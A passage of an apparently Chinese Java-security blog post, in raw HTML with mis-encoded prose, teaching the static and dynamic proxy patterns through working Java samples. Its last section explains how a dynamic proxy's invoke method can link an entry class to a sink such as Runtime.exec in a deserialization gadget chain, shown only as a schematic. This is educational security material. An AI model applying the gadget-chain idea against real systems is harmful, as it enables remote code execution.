class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);  <br> proxy.rent();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æœ‰ä¸€äº›è¡Œä¸ºæ˜¯ä¸­ä»‹å¯ä»¥åšçš„ï¼Œè€Œæˆ¿ä¸œä¸èƒ½åšçš„ï¼Œæ¯”å¦‚çœ‹æˆ¿ï¼Œæ”¶ä¸­ä»‹è´¹ç­‰ç­‰ã€‚æ‰€ä»¥æˆ‘ä»¬è¦åœ¨ <strong>Proxy.java</strong> å½“ä¸­å®ç°è¿™äº›åŠŸèƒ½ã€‚(è¿™é‡Œå°±ä½“ç°å‡ºæ¥ä»£ç†æ¨¡å¼çš„å¥½å¤„)</li></ul><p>æ”¹è¿› <strong>Proxy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// ä¸­ä»‹  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> Host host;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.host = host;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>&#123;  <br>        host.rent();  <br> contract();  <br> fare();  <br> &#125;  <br>  <br>    <span class="hljs-comment">// çœ‹æˆ¿  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-comment">// æ”¶ä¸­ä»‹è´¹  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;æ”¶ä¸­ä»‹è´¹&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-comment">// ç­¾ç§ŸèµåˆåŒ  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contract</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;ç­¾ç§ŸèµåˆåŒ&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a27.png"></p><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>å¯ä»¥ä½¿å¾—æˆ‘ä»¬çš„çœŸå®è§’è‰²æ›´åŠ çº¯ç²¹ . ä¸å†å»å…³æ³¨ä¸€äº›å…¬å…±çš„äº‹æƒ… .</li><li>å…¬å…±çš„ä¸šåŠ¡ç”±ä»£ç†æ¥å®Œæˆ . å®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥ ,</li><li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶å˜å¾—æ›´åŠ é›†ä¸­å’Œæ–¹ä¾¿ .</li></ul><p><strong>ç¼ºç‚¹ :</strong></p><ul><li>ä¸€ä¸ªçœŸæ˜¯ç±»å¯¹åº”ä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡é™ä½ .</li></ul><p>æˆ‘ä»¬æƒ³è¦é™æ€ä»£ç†çš„å¥½å¤„ï¼Œåˆä¸æƒ³è¦é™æ€ä»£ç†çš„ç¼ºç‚¹ï¼Œæ‰€ä»¥ , å°±æœ‰äº†åŠ¨æ€ä»£ç† !</p><h4 id="æ·±å…¥ç†è§£é™æ€ä»£ç†"><a href="#æ·±å…¥ç†è§£é™æ€ä»£ç†" class="headerlink" title="æ·±å…¥ç†è§£é™æ€ä»£ç†"></a>æ·±å…¥ç†è§£é™æ€ä»£ç†</h4><p>æ·±å…¥åˆ°å®é™…ä¸šåŠ¡å½“ä¸­ï¼Œæ¯”å¦‚æˆ‘ä»¬å¹³å¸¸åšçš„æœ€å¤šçš„ CRUD</p><ul><li><code>UserService.java</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å®šä¹‰å››ä¸ªæŠ½è±¡æ–¹æ³•ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-comment">// æ·±å…¥ç†è§£é™æ€ä»£ç†  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªçœŸå®å¯¹è±¡æ¥å®Œæˆè¿™äº›å¢åˆ æ”¹æŸ¥æ“ä½œ<br><strong>UserServiceImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€æ±‚æ¥äº†ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦å¢åŠ ä¸€ä¸ªæ—¥å¿—åŠŸèƒ½ï¼Œæ€ä¹ˆå®ç°ï¼</p><ul><li>æ€è·¯1 ï¼šåœ¨å®ç°ç±»ä¸Šå¢åŠ ä»£ç  ã€éº»çƒ¦ï¼ã€‘</li><li>æ€è·¯2ï¼šä½¿ç”¨ä»£ç†æ¥åšï¼Œèƒ½å¤Ÿä¸æ”¹å˜åŸæ¥çš„ä¸šåŠ¡æƒ…å†µä¸‹ï¼Œå®ç°æ­¤åŠŸèƒ½å°±æ˜¯æœ€å¥½çš„äº†ï¼</li></ul><blockquote><p>å¤„ç†æ‰‹æ®µï¼šå¢åŠ ä¸€ä¸ªä»£ç†ç±»æ¥å¤„ç†æ—¥å¿—~</p></blockquote><p><strong>UserServiceProxy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-comment">// ä»£ç†  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;  <br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.userService = userService;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;add&quot;</span>);  <br> userService.add();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;delete&quot;</span>);  <br> userService.delete();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;update&quot;</span>);  <br> userService.update();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;query&quot;</span>);  <br> userService.query();  <br> &#125;  <br>  <br>    <span class="hljs-comment">// å¢åŠ æ—¥å¿—æ–¹æ³•  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;[Debug]ä½¿ç”¨äº† &quot;</span> + msg +<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å¯åŠ¨å™¨ <strong>Client.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();  <br>  <br> <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();  <br> proxy.setUserService(userService);  <br> proxy.add();  <br>  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a28.png"></p><h3 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h3><ul><li>å‰æ–‡æˆ‘ä»¬è¯´åˆ°é™æ€ä»£ç†çš„é—®é¢˜ï¼Œè¿˜è®°å¾—å—ï¼Ÿ</li></ul><p>æ¯å¤šä¸€ä¸ªæˆ¿ä¸œå°±éœ€è¦å¤šä¸€ä¸ªä¸­ä»‹ï¼Œè¿™æ˜¾ç„¶ä¸ç¬¦åˆç”Ÿæ´»è®¤çŸ¥ï¼ˆå¯¹äºç§Ÿå®¢æ¥è¯´ï¼Œå¦‚æœæ˜¯ç”¨é™æ€ä»£ç†æ¨¡å¼ï¼Œæ¯å½“æƒ³è¦æ¢ä¸€ä¸ªæˆ¿ä¸œï¼Œé‚£å°±å¿…é¡»è¦å†æ¢ä¸€ä¸ªä¸­ä»‹ï¼Œåœ¨å¼€å‘ä¸­ï¼Œå¦‚æœæœ‰å¤šä¸ªä¸­ä»‹ä»£ç é‡å°±æ›´å¤§äº†ï¼‰</p><p>åŠ¨æ€ä»£ç†çš„å‡ºç°å°±æ˜¯ä¸ºäº†è§£å†³ä¸Šé¢é™æ€ä»£ç†çš„ç¼ºç‚¹ã€‚</p><h4 id="åŠ¨æ€ä»£ç†çš„ä»£ç å®ç°"><a href="#åŠ¨æ€ä»£ç†çš„ä»£ç å®ç°" class="headerlink" title="åŠ¨æ€ä»£ç†çš„ä»£ç å®ç°"></a>åŠ¨æ€ä»£ç†çš„ä»£ç å®ç°</h4><ul><li>è¦å†™åŠ¨æ€ä»£ç†çš„ä»£ç ï¼Œéœ€è¦æŠ“ç‰¢ä¸¤ä¸ªè¦ç‚¹</li></ul><p>â‘ ï¼šæˆ‘ä»¬ä»£ç†çš„æ˜¯æ¥å£ï¼Œè€Œä¸æ˜¯å•ä¸ªç”¨æˆ·ã€‚<br>â‘¡ï¼šä»£ç†ç±»æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œè€Œéé™æ€å®šæ­»ã€‚</p><p>é¦–å…ˆæ˜¯æˆ‘ä»¬çš„æ¥å£ç±»<br><strong>UserService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å®ä½“ç±»å»å®ç°è¿™ä¸ªæŠ½è±¡ç±»</p><p><strong>UserServiceImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€ï¼Œæ˜¯åŠ¨æ€ä»£ç†çš„å®ç°ç±» (åˆ©ç”¨åå°„æœºåˆ¶å®ç°)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;  <br>  <br>    <span class="hljs-comment">// è¢«ä»£ç†çš„æ¥å£  </span><br> <span class="hljs-keyword">private</span> UserService userService;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserService userService)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.userService = userService;  <br> &#125;  <br>  <br>    <span class="hljs-comment">// åŠ¨æ€ç”Ÿæˆä»£ç†ç±»å®ä¾‹  </span><br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(), userService.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>  <br>    <span class="hljs-comment">// å¤„ç†ä»£ç†ç±»å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ  </span><br> <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        log(method);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> method.invoke(userService, args);  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>  <br>    <span class="hljs-comment">//ä¸šåŠ¡è‡ªå®šä¹‰éœ€æ±‚  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(Method method)</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;[Info] &quot;</span> + method.getName() + <span class="hljs-string">&quot;æ–¹æ³•è¢«è°ƒç”¨&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æœ€åç¼–å†™æˆ‘ä»¬çš„ Clientï¼Œä¹Ÿå°±æ˜¯å¯åŠ¨å™¨</li></ul><p><strong>Client.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br>  <br><span class="hljs-keyword">import</span> src.JdkProxy.DynamicProxy.UserServiceImpl;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-comment">// çœŸå®è§’è‰²  </span><br> <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userServiceImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();  <br> <span class="hljs-comment">// ä»£ç†è§’è‰²ï¼Œä¸å­˜åœ¨  </span><br> <span class="hljs-type">UserProxyInvocationHandler</span> <span class="hljs-variable">userProxyInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxyInvocationHandler</span>();  <br> userProxyInvocationHandler.setUserService((UserService) userServiceImpl); <span class="hljs-comment">// è®¾ç½®è¦ä»£ç†çš„å¯¹è±¡  </span><br>  <br> <span class="hljs-comment">// åŠ¨æ€ç”Ÿæˆä»£ç†ç±»  </span><br> <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) userProxyInvocationHandler.getProxy();  <br>  <br> proxy.add();  <br> proxy.delete();  <br> proxy.update();  <br> proxy.query();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åœ¨ååºåˆ—åŒ–ä¸­åŠ¨æ€ä»£ç†çš„ä½œç”¨"><a href="#åœ¨ååºåˆ—åŒ–ä¸­åŠ¨æ€ä»£ç†çš„ä½œç”¨" class="headerlink" title="åœ¨ååºåˆ—åŒ–ä¸­åŠ¨æ€ä»£ç†çš„ä½œç”¨"></a>åœ¨ååºåˆ—åŒ–ä¸­åŠ¨æ€ä»£ç†çš„ä½œç”¨</h2><p>å›åˆ°ä¹‹å‰æ–‡ç« çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´è¦åˆ©ç”¨ååºåˆ—åŒ–çš„æ¼æ´ï¼Œæˆ‘ä»¬æ˜¯éœ€è¦ä¸€ä¸ªå…¥å£ç±»çš„ã€‚</p><p>æˆ‘ä»¬å…ˆå‡è®¾å­˜åœ¨ä¸€ä¸ªèƒ½å¤Ÿæ¼æ´åˆ©ç”¨çš„ç±»ä¸º <code>B.f</code>ï¼Œæ¯”å¦‚ <code>Runtime.exec</code> è¿™ç§ã€‚<br>æˆ‘ä»¬å°†å…¥å£ç±»å®šä¹‰ä¸º <code>A</code>ï¼Œæˆ‘ä»¬æœ€ç†æƒ³çš„æƒ…å†µæ˜¯ A[O] -&gt; O.fï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä¼ è¿›å»çš„å‚æ•° <code>O</code> æ›¿æ¢ä¸º <code>B</code> å³å¯ã€‚ä½†æ˜¯åœ¨å®æˆ˜çš„æƒ…å†µä¸‹è¿™ç§æƒ…å†µæ˜¯æå°‘çš„ã€‚</p><p>å›åˆ°å®æˆ˜æƒ…å†µï¼Œæ¯”å¦‚æˆ‘ä»¬çš„å…¥å£ç±» <code>A</code> å­˜åœ¨ <code>O.abc</code> è¿™ä¸ªæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ A[O] -&gt; O.abcï¼›è€Œ O å‘¢ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»ï¼Œ<code>O</code> çš„ <code>invoke</code> æ–¹æ³•é‡Œå­˜åœ¨ <code>.f</code> çš„æ–¹æ³•ï¼Œä¾¿å¯ä»¥æ¼æ´åˆ©ç”¨äº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯å±•ç¤ºä¸€ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">A[O] -&gt; O.abc<br>O[O2] invoke -&gt; O2.f <span class="hljs-comment">// æ­¤æ—¶å°† B å»æ›¿æ¢ O2</span><br>æœ€å  ----&gt;<br>O[B] invoke -&gt; B.f <span class="hljs-comment">// è¾¾åˆ°æ¼æ´åˆ©ç”¨æ•ˆæœ</span><br></code></pre></td></tr></table></figure><p>åŠ¨æ€ä»£ç†åœ¨ååºåˆ—åŒ–å½“ä¸­çš„åˆ©ç”¨å’Œ <code>readObject</code> æ˜¯å¼‚æ›²åŒå·¥çš„ã€‚</p><p><code>readObject</code> æ–¹æ³•åœ¨ååºåˆ—åŒ–å½“ä¸­ä¼šè¢«è‡ªåŠ¨æ‰§è¡Œã€‚<br>è€Œ <code>invoke</code> æ–¹æ³•åœ¨åŠ¨æ€ä»£ç†å½“ä¸­ä¼šè‡ªåŠ¨æ‰§è¡Œã€‚</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a29.png"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a 